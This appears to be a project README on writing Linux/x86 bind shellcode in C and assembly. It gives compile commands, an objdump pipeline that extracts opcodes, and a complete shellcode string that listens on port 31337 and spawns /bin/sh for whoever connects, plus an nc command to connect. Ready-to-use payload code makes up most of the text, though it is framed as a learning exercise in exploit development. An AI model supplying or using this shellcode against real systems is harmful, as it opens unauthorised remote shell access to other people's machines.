# Linux-x86-bind-shellcode-with-C-and-Assembly

Linux/x86 bind shellcode with C and Assembly 

*jump to this common bind shell in C

How To Use : 

(1)

-gcc blind_shell.c -o blind_shell  
  [or]
-gcc -m32 blind_shell -o blind_shell

Run: 

./blind_shell

listen : 

nc -vvv localhost 31337 ( localhost is testing in my local network )


......................................................................

    Important Notes!

    I know there are many articles out there that creating same shellcode as well. As I promised earlier, I’ll create a shellcode that literally easier to understand more than most of the articles.

    The consequence is, this shellcode will be much longer compared to another’s. But I don’t care since your understanding is the most important thing.
    
........................................................................
(2)

-nasm -f elf32 -o BindShell.o BindShell.nasm
-ld -o BindShell BindShell.o


Jump the Shellcode :


objdump -d ./BindShell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


Shellcode :

"\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb3\x02\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\xb0\x66\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80\xb0\x01\xb3\x01\xcd\x80"

Thanks for reading! :)

Best Regards,

Thank :  Habibie Faried : Omicron John : Xero 

